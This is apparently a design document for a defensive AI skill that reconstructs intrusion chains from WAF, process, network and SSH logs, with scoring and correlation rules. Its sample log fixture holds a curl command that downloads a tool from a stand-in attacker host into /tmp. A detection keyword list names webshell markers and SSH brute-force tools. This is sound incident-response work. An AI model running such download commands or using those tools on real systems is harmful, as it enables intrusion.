**Languages:** English (this page) | [简体中文](15-traceability-analysis-skill-design.zh-CN.md)

# Traceability Analysis Skill Design

> Public cases and inputs/outputs are in the [Skill examples](../src/skills/traceability-analysis/examples.md); no internal product-planning material is required.

> SecWeaver fifth of six core capabilities  
> Purpose: After data sources meet minimum requirements, **reconstruct attack chains across multiple log sources**, locate initial entry, lateral paths, and impact scope  
> **Current implementation reference (2026-09-16)**: [entry point](../src/skills/traceability-analysis/scripts/correlate.py), [analysis engine](../src/skills/traceability-analysis/scripts/traceability_analysis/engine.py), and [user guide](../docs_user/18-traceability-analysis.md). Historical architecture assessments explain earlier design decisions.

---

## 1. Skill Positioning

### 1.1 What problem it solves

Data source completeness analysis answers "**can we investigate**"; traceability analysis answers "**what did we find**":

| User question | Traceability Skill should deliver |
|---|---|
| Where was the first compromise? | Initial victim host, entry URL/vulnerability type, first success time |
| Which machines did the attacker move to? | Lateral path list, jump relationships, login accounts |
| Is the attack chain complete? | Staged timeline + evidence reference per step |
| How large is the impact? | Victim host list, data domains, isolation priority recommendations |

### 1.2 Boundaries with other Skills

```text
Data source completeness ──(not blocked)──▶ Traceability analysis ──▶ Remediation / report
        │                              ▲
        │                              │
Alert confirmation ──(confirmed real attack + success)──┘
        │
Risk identification ──(exec/connect high-risk events)────▶ Can feed traceability clues
```

| Skill | Responsibility | Does not |
|---|---|---|
| Data source completeness | Assess whether data is sufficient | Reconstruct attack chains |
| **Traceability analysis** | Cross-source correlation, attack chain, timeline | False positive triage (→ alert confirmation) |
| Alert confirmation | Attempt / real / FP, success or not | Full lateral investigation |
| External listener command risk | Single exec triage | Cross-host chain reconstruction |

### 1.3 Prerequisites (hard constraints)

Start this Skill only when upstream **data source completeness analysis** meets:

| Condition | Description |
|---|---|
| `next_skill_blocked = false` | P0 data sources present |
| `overall_verdict` ∈ `full_traceable`, `partial_traceable` | Do not force traceability on `not_traceable` |
| User has selected relevant data assets | Consistent with completeness assessment assets |

If user skips completeness precheck and demands traceability, Claw **should run completeness first**, or clearly mark "conclusion confidence limited by data gaps."

---

## 2. Applicable Scenarios (inherits S1–S8; focuses on chain reconstruction)

Traceability Skill does not redefine scenario taxonomy—it **reuses** completeness `S1–S8`, but **output emphasis** differs per scenario:

| Scenario | Traceability output focus |
|---|---|
| **S1** External IP traceability | Entry host, first breach time, lateral list |
| **S2** WEB intrusion | WebShell path, exploited URL, dropped files |
| **S3** Lateral movement | Jump graph, SSH/RDP login sequence, internal scan |
| **S4** | ⚠️ Usually alert confirmation; traceability only if user explicitly asks for "full attack chain" |
| **S5** | Expand single exec anomaly to "who triggered, what connected next" |
| **S6** Account compromise | Compromised account, first anomalous login, subsequent actions |
| **S7** Data exfiltration | Exfil path, packaging commands, destination IP/domain |
| **S8** C2 communication detection | Callback processes, domains, and network-session paths; DNS matches alone do not prove C2 |

**Public example main scenario**: S1 + S3 (external IP → WEB breach → SSH lateral).

---

## 3. Input Design

### 3.1 Required input

```json
{
  "investigation_intent": "Alert time A, attacker IP A—find first compromise point and lateral scope",
  "scenarios": ["S1", "S3"],
  "params": {
    "attacker_ip": "203.0.113.10",
    "time_start": "2026-06-21T08:00:00+08:00",
    "time_end": "2026-06-21T20:00:00+08:00",
    "alert_time": "2026-06-21T10:00:00+08:00",
    "seed_hosts": [],
    "alert_id": null
  },
  "completeness_precheck": {
    "overall_verdict": "partial_traceable",
    "confidence": 0.72,
    "next_skill_blocked": false,
    "data_gaps": ["ssh_auth coverage partial"]
  },
  "evidence_bundles": {
    "waf_alert": [],
    "web_access_log": [],
    "host_exec": [],
    "host_connect": [],
    "host_file_op": [],
    "ssh_auth": [],
    "firewall_log": [],
    "dns_log": [],
    "asset_inventory": []
  }
}
```

### 3.2 Field descriptions

| Field | Description |
|---|---|
| `params.attacker_ip` | Anchor: external attacker IP (can be multiple) |
| `params.alert_time` | Anchor: first alert or user focus time |
| `params.time_start/end` | Analysis window; default `[alert_time-24h, alert_time+6h]` |
| `completeness_precheck` | Upstream completeness Skill summary; caps confidence |
| `evidence_bundles` | **Retrieved raw events** grouped by asset_type; Skill analyzes given evidence only, does not fabricate |

### 3.3 Minimum evidence fields (aligned with audit-port-execmon)

**host_exec** (audit-port-execmon):

```json
{
  "event_type": "exec",
  "host": "web-01",
  "timestamp": "2026-06-21T09:15:22+08:00",
  "listener_port": 443,
  "listener_process": "nginx",
  "command": ["curl", "-o", "/tmp/sshscan", "http://evil.example/tool"],
  "cwd": "/var/www/html"
}
```

**host_connect**:

```json
{
  "event_type": "active_connect",
  "host": "web-01",
  "timestamp": "2026-06-21T09:15:20+08:00",
  "dst_ip": "198.51.100.5",
  "dst_port": 80
}
```

**ssh_auth**:

```json
{
  "host": "db-01",
  "timestamp": "2026-06-21T09:22:01+08:00",
  "src_ip": "10.0.1.5",
  "user": "root",
  "result": "Accepted"
}
```

**waf_alert**:

```json
{
  "src_ip": "203.0.113.10",
  "timestamp": "2026-06-21T09:10:05+08:00",
  "url": "/upload/shell.php",
  "payload": "...",
  "action": "blocked"
}
```

---

## 4. Output Design

### 4.1 Dual-channel output

Same as completeness Skill:

1. **Structured JSON**: platform reports, graphs, downstream remediation
2. **Markdown investigation report**: direct reading for analysts

### 4.2 JSON main structure

This is an actual output excerpt from the [public synthetic input](../examples/traceability/s1-web-shell-to-ssh-lateral.json), checked against current code. It is a different case from the input-shape illustration above. Evidence, context, and report fields omitted here remain in the full output.

After `make quickstart`, reproduce it from the repository root:

```bash
make ai-showcase CASE=webshell-to-ssh-lateral
```

```json
{
  "alert_type": "traceability_analysis",
  "scenario": [
    "S1",
    "S2",
    "S3"
  ],
  "overall_verdict": "confirmed_intrusion_chain",
  "confidence": 0.88,
  "confidence_ceiling": 0.88,
  "blocked": false
}
```

The full JSON is `outputs/ai-showcase/webshell-to-ssh-lateral.json`; the agent-generated Markdown report is a separate output. These values apply only to this fixed synthetic case.

### 4.3 overall_verdict enum

| verdict | Meaning | Condition |
|---|---|---|
| `confirmed_intrusion_chain` | Complete attack chain, sufficient evidence | Entry + execution + lateral all have direct evidence |
| `likely_intrusion_chain` | Highly suspected; some steps inferred | Some steps only indirect evidence |
| `initial_access_only` | Entry confirmed; lateral not proven | WEB breach evidence, no SSH success |
| `scanning_or_attempt_only` | Scan/attempt only, no breach | WAF alerts only, no D2 success evidence |
| `insufficient_evidence` | Insufficient evidence for conclusion | Similar to completeness blocked but user forced analysis |

### 4.4 Confidence rules

A blocked precheck produces a blocked result immediately. Otherwise the ceiling is read as
`float((completeness_precheck or {}).get("confidence") or 1.0)`. Missing or numeric-zero confidence currently falls back to 1.0; do not use zero instead of `next_skill_blocked`.

[compute_confidence](../src/skills/traceability-analysis/scripts/traceability_analysis/result.py) starts with the arithmetic mean of stage confidences, not a weighted mean. Missing stage values use `policy.confidence_defaults.stage_fallback` in `heuristic-rules.json`. An empty chain uses `min(empty_chain_cap, ceiling)`.

The analysis engine then applies configured `confidence_adjustments` for matrix Join coverage and likely lateral evidence. Each adjustment is capped with `min(ceiling, score)` and rounded to two decimals. Individual stage confidences may exceed the overall ceiling, but the final output `confidence` must not exceed `confidence_ceiling`. Rule files define the thresholds and bonuses.

**Hard rules**:

- No `host_exec` success evidence → cannot be `confirmed_intrusion_chain`
- No `ssh_auth` Accepted → cannot assert lateral to X as confirmed; at most `likely`
- SSH log coverage=partial → `impacted_assets` must note "possible omissions"

---

## 5. Triage Workflow (Skill core algorithm)

### 5.1 Six-step pipeline

```text
Step 0  Gate: read completeness_precheck; abort if blocked
Step 1  Anchor: from D1 using attacker_ip / alert_time, pull first related events
Step 2  Entry: determine initial_access (WEB URL, WebShell, vulnerability type)
Step 3  Host behavior: on entry host correlate exec → connect → file_op timeline
Step 4  Lateral: use entry host internal IP as src; expand via ssh_auth + firewall
Step 5  Graph: generate attack_chain + lateral_movement_graph
Step 6  Conclusion: verdict + remediation + data_gaps_impact
```

### 5.2 Correlation rules (Join Keys)

| Step | Correlation method |
|---|---|
| WAF → exec | `attacker_ip` + `host` + time window ±15min |
| exec → connect | Same `host`, same `pid` or ±2min; `curl/wget` matches dst |
| exec → file_op | Same `host`, ±5min; `/tmp`, `/var/www` paths |
| web host → SSH | `ssh_auth.src_ip` = web host internal IP |
| SSH spread | New victim host src_ip becomes next-hop seed; iterate BFS |
| Firewall assist | Five-tuple confirms web→internal:22 connection |

### 5.3 Lateral spread algorithm (BFS)

```text
seeds = [initial_access.host]
visited = {}
while seeds not empty:
  h = pop seed
  find ssh_auth where src_ip = ip(h) AND result = Accepted
  find firewall where src_ip = ip(h) AND dst_port = 22
  for each new target host t:
    if t not in visited: add to attack_chain, push t to seeds
stop when: time window ends / no new Accepted / max_hops=10 reached
```

Output must distinguish:

- **confirmed_lateral**: SSH Accepted + temporal continuity + explainable source IP
- **suspected_lateral**: Many Failed only, or firewall connection without Accepted
- **unknown**: Data coverage gap

---

## 6. Public Traceability Scenario Mapping (S1+S3)

### 6.1 Event playbook

```text
203.0.113.10 → WEB WebShell → shell → curl download SSH brute tool
→ lateral SSH from web-01 to multiple internal servers
```

### 6.2 Per-stage evidence checklist

| Stage | Expected evidence | Data source |
|---|---|---|
| 1. External attack | WAF alert/access log with attacker_ip | waf_alert, web_access_log |
| 2. WebShell exploit | Suspicious URL, POST payload | waf_alert |
| 3. Command execution | nginx child bash/curl | host_exec |
| 4. Tool download | connect to external 80/443 | host_connect |
| 5. Tool drop | New file under /tmp | host_file_op |
| 6. Internal SSH scan | Many Failed then Accepted | ssh_auth |
| 7. Lateral path | web-01 IP → internal :22 | firewall_log |

### 6.3 Dialog example output structure

User: "Alert time A, attacker IP A—analyze first compromise point and lateral events"

Markdown should include:

1. **Executive summary** (3 sentences)
2. **Initial entry** (host, time, URL, evidence IDs)
3. **Attack timeline** (table: time | stage | host | event | evidence)
4. **Lateral movement** (list or mermaid diagram)
5. **Impact scope and remediation**
6. **Data gap notes** (if partial_traceable)
7. **Unanswered questions** (honest gaps)

---

## 7. MITRE ATT&CK Stage Mapping (recommended built-in)

Each attack_chain node should label `stage` + optional `mitre_id` for SOC reporting:

| stage | Typical SecWeaver evidence |
|---|---|
| `reconnaissance` | WAF scan alerts, many 404s |
| `initial_access` | WebShell URL, exploit payload |
| `execution` | host_exec: bash/sh/python |
| `persistence` | host_file_op: crontab, webshell file |
| `command_and_control` | host_connect: external C2 port |
| `lateral_movement` | ssh_auth Accepted, internal connect |
| `collection` | tar/zip commands |
| `exfiltration` | Heavy egress, proxy logs |

**Full coverage not required**—write only stages with evidence; put others in `hypotheses`, not attack_chain.

---

## 8. Division of Labor with Alert Confirmation Skill

| Dimension | Alert confirmation | Traceability analysis |
|---|---|---|
| Input | Single/batch WAF alerts | Multi-source evidence_bundles |
| Core question | FP? Real? Success? | Where entry? Lateral where? |
| Output | verdict: attempt/real/fp | attack_chain + graph |
| Trigger | "Analyze this alert" | "Trace attack chain / lateral / entry point" |

Recommended orchestration:

```text
WAF alert only → alert confirmation
alert confirmation = real and success → traceability (expand chain)
Known IP direct chain query → completeness → traceability
```

---

## 9. Skill File Layout

```text
src/skills/traceability-analysis/
├── SKILL.md              # Claw entry: flow, I/O, prohibitions
├── heuristic-rules.json    # TigerSec heuristic thresholds (ops-editable)
├── rules.md              # Correlation rules, stage determination, verdict logic
├── attack-patterns.json    # Deprecated stub → see risk-identification/rules/chain-patterns.json
├── examples.md           # S1 + S3 full traceability example
└── scripts/
    ├── correlate.py       # Thin CLI entrypoint and compatibility exports
    ├── traceability_analysis/
    │   ├── paths.py       # Skill/catalog/shared data-access paths
    │   ├── common.py      # JSON, timestamp, host, and evidence-index helpers
    │   ├── initial_access.py # D1 initial access and victim reverse lookup
    │   ├── execution.py   # Host execution chain stage detection
    │   ├── lateral.py     # SSH lateral detection and BFS helpers
    │   ├── result.py      # Gate, verdict, confidence, blocked result, report wrapper
    │   ├── engine.py      # analyze() orchestration
    │   └── cli.py         # argparse, fetch summary, webhook, output handling
    ├── correlation_trace.py
    ├── risk_rules_bridge.py
    └── source_adapters/
```

> **2026-07-02:** Attack narratives live in `risk-identification/rules/chain-patterns.json` (shared with risk-identification).

### 9.1 SKILL.md sections

1. YAML frontmatter (name + description trigger words)
2. Prerequisites (completeness_precheck gate)
3. Input schema + evidence_bundles format
4. Six-step triage flow (no skipping)
5. Output JSON + Markdown template
6. verdict / confidence constraint tables
7. Prohibitions (no conclusion without evidence, no bypass blocked)
8. Downstream remediation format

### 9.2 rules.md contents

1. Correlation Join rule table (time windows, keys)
2. BFS lateral spread pseudocode
3. Per asset_type event → attack stage mapping
4. WebShell / curl download / SSH brute force patterns
5. When to write hypotheses vs attack_chain
6. Confidence scoring rules

### 9.3 chain-patterns.json preset patterns (shared with risk-identification)

Path: `risk-identification/rules/chain-patterns.json`. Traceability loads via `risk_rules_bridge.resolve_matched_pattern()`. Stage indicators reference `matched_rule` in exec/attck rules — do not duplicate keyword lists under traceability.

Legacy `attack-patterns.json` `indicators{}` format is deprecated.

Minimum supported operational pattern:

```json
{
  "id": "web_shell_to_ssh_lateral",
  "name": "WebShell → tool download → SSH lateral",
  "stages": ["initial_access", "execution", "lateral_movement"],
  "indicators": {
    "initial_access": ["webshell", "upload", ".php", "cmd="],
    "execution": ["curl", "wget", "bash", "chmod"],
    "lateral_movement": ["ssh", "hydra", "ncrack", "Accepted"]
  }
}
```

---

## 10. Prohibitions (Skill hard constraints)

1. **No evidence, no conclusion**: every attack_chain entry must have `evidence_refs`
2. **Do not fabricate logs**: events not in evidence_bundles must not appear
3. **Respect blocked**: `next_skill_blocked=true` → no confirmed conclusions
4. **Distinguish confirmed / likely / suspected**: lateral movement must use three levels
5. **Mark coverage gaps**: incomplete SSH → do not write "lateral to N hosts only" without "at least"
6. **Monotonic timeline**: attack_chain sorted by timestamp; conflicts lower confidence
7. **Do not replace alert confirmation**: no FP triage on single WAF (unless user explicitly requests and scenario includes S4)

---

## 11. Deterministic Implementation Boundaries

| Module | Does | Does not |
|---|---|
| `correlate.py` | Preserve `python correlate.py ...` and old `import correlate` compatibility | Hold new business logic |
| `traceability_analysis/engine.py` | Orchestrate gate → normalize → matrix → heuristic → verdict JSON | Low-level matching details |
| `traceability_analysis/initial_access.py` | D1 initial access, exec-inferred entry, victim reverse lookup | Lateral BFS |
| `traceability_analysis/execution.py` | Host execution/download stages | Initial D1 web matching |
| `traceability_analysis/lateral.py` | SSH lateral from exec/auth and BFS graph | Final verdict policy |
| `traceability_analysis/result.py` | Precheck gate, verdict, confidence, blocked result, report wrapper | Evidence parsing |
| `correlation_trace.py` | Matrix contract, join→stage mapping, stage merge | Heuristic-only BFS |

AI Skill: read skeleton + raw evidence → generate summary, hypotheses, remediation.

---

## 12. Success Criteria (Skill acceptance)

Using the public Web-to-SSH lateral movement example with complete evidence_bundles:

- [ ] Correctly identify `web-01` as initial_access
- [ ] Timeline includes WebShell → curl → SSH Accepted
- [ ] List all SSH Accepted lateral targets
- [ ] Output mermaid/graph renderable
- [ ] Partial SSH coverage notes "possible omissions"
- [ ] Missing exec → verdict at most `scanning_or_attempt_only`

---

## 13. One-Line Summary

**Traceability analysis Skill = given sufficient data, use "anchor IP/time → staged correlation → lateral BFS → evidence chain output" to reconstruct multi-source logs into an attack chain report analysts can act on; strictly depends on evidence_refs; confidence capped by upstream completeness analysis.**

---

*Document version: v1.2 | Updated: 2026-09-16 | Status: Skill implemented and split by responsibility → `src/skills/traceability-analysis/`*
